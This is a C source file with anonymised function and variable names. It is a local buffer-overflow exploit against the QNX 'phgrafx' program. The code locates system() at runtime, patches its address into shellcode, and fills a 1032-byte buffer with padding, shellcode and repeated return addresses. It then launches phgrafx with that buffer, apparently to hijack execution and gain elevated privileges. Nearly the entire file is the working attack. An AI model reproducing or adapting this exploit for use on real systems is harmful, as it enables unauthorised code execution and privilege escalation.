
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 void* FUNC_0 (int *,int ) ;
 scalar_t__ FUNC_1 (void*,char*) ;
 int FUNC_2 (int,char*) ;
 int FUNC_3 (int ,char*,char*,int *) ;
 int FUNC_4 () ;
 scalar_t__ FUNC_5 (int) ;
 int FUNC_6 (char*,long*,int) ;
 int FUNC_7 (char*,int ,int) ;
 int FUNC_8 (char*,long) ;
 int FUNC_9 (char*) ;
 char* VAR_3 ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*,int *,int ) ;

int FUNC_12 (int VAR_4, char **VAR_5) {

  int VAR_6, VAR_7 = FUNC_10 (VAR_3), VAR_8 = 0;
  long VAR_9, *VAR_10, VAR_11;
  char *VAR_12;
  void *VAR_13;

  VAR_13 = FUNC_0 (((void*)0), VAR_0);
  VAR_11 = (long) FUNC_1 (VAR_13, "system");

  for (VAR_6 = 0; VAR_6 < 4; VAR_6++) {
     char VAR_14 = (*((char *) &VAR_11 + VAR_6) & 0xff);
     if (VAR_14 == 0x00 || VAR_14 == 0x09 || VAR_14 == 0x0a) {
        FUNC_9
          ("currently system()'s address contains bytes like 0x00, 0x09 or 0x0a, so it probably won't work since"
           " the application seems to truncate those bytes. BTW you can rely on functions like exec*(), spawn*()"
           " or MsgSend*() to get this working.\n"
           "more at http://www.qnx.org/developers/docs/momentics621_docs/neutrino/lib_ref/");
        return (-1);
     }
  }

  FUNC_6((char *)&VAR_3 + 0xf, &VAR_11, 4);

  if (VAR_4 > 1)
    VAR_8 = FUNC_11(VAR_5[1], ((void*)0), 0);

  if (!(VAR_12 = (char *) FUNC_5(1032)))
    FUNC_2(1, "malloc()");

  FUNC_7(VAR_12, 0, 1032);

  for (VAR_6 = 0; VAR_6 < (VAR_2 - VAR_7); VAR_6++)
    VAR_12[VAR_6] = 'A';

  FUNC_8("shellcode length: %d\n", VAR_7);

  for (VAR_6 = (VAR_2 - VAR_7); VAR_6 < VAR_2; VAR_6++)
    VAR_12[VAR_6] = VAR_3[VAR_6 - (VAR_2 - VAR_7)];

  VAR_10 = (long *) (VAR_12 + VAR_2);

  FUNC_8("address: 0x%lx\n", VAR_9 = (FUNC_4 () - VAR_8));

  for (VAR_6 = 0; VAR_6 < ((1024 - VAR_2) / 4); VAR_6++)
    *(VAR_10 + VAR_6) = (int) VAR_9;

  FUNC_3(VAR_1, "phgrafx", VAR_12, ((void*)0));

  return (0);
}
